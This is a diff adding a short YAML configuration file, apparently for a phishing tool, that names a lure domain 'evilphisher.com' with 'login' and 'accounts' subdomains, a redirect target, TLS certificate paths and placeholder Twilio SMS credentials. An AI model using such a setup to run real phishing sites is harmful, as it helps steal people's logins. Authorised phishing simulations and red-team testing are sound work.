@@ -1,0 +1,9 @@
+root_domain: "evilphisher.com"
+subdomains: "login accounts"
+redirect_url: "orf.at"
+use_live_feed: true
+ssl_cert_path: "/etc/letsencrypt/live/evilphisher.com/fullchain.pem"
+ssl_key_path: "/etc/letsencrypt/live/evilphisher.com/privkey.pem"
+twilio_account_sid: "SID"
+twilio_auth_token: "AUTHTOKEN"
+twilio_phone_number: "+12345656789"
